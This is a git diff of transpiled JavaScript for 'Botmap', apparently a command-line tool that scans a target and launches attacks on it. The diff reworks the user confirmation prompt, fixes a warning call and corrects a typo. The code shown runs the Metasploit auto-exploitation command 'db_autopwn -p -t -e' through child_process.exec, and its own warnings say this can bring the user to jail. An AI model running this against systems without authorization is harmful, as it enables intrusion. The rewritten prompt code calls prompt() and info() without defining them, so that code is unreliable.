@@ -12,8 +12,6 @@ var _safe2 = _interopRequireDefault(_safe);
 
 var _prompt = require('prompt');
 
-var _prompt2 = _interopRequireDefault(_prompt);
-
 function _interopRequireDefault(obj) { return obj && obj.__esModule ? obj : { default: obj }; }
 
 //set theme
@@ -35,12 +33,12 @@ function userAuth() {
   console.warn(_safe2.default.warn("Note,that you need the permission of the target's owner !"));
   console.warn(_safe2.default.warn('Are you sure you want to scan and attack: \n' + target));
   console.log(_safe2.default.prompt('Press y to continue'));
-  _prompt2.default.start();
-  _prompt2.default.get('input', function (err, result) {
-    if (result.input != 'y') {
-      process.exit(1);
-    }
-  });
+  var input = prompt();
+
+  if (input != 'y') {
+    console.log(info('Maybe a wise decision..'));
+    process.exit(1);
+  }
 }
 
 //perform exploit
@@ -96,7 +94,7 @@ function exploit(target) {
       console.log(_safe2.default.info('HOST:' + stdout));
     }
   });
-  console.warn(warn('Note that the following action can bring you to jail ! \n Botmap can not stop the action once it started !'));
+  console.warn(_safe2.default.warn('Note that the following action can bring you to jail ! \n Botmap can not stop the action once it started !'));
   (0, _child_process.exec)('db_autopwn -p -t -e', function (err, stdout, stderr) {
     if (err || stderr) {
       var error = err || stderr;
@@ -186,6 +184,6 @@ if (userArgs[0] == 'target' || userArgs[0] == '-t') {
   setup();
 } else {
   //botmap [wrong args]
-  console.error(_safe2.default.red('Unknownen Argumen(s)'));
+  console.error(_safe2.default.red('Unknownen Argument(s)'));
   process.exit(1);
 }
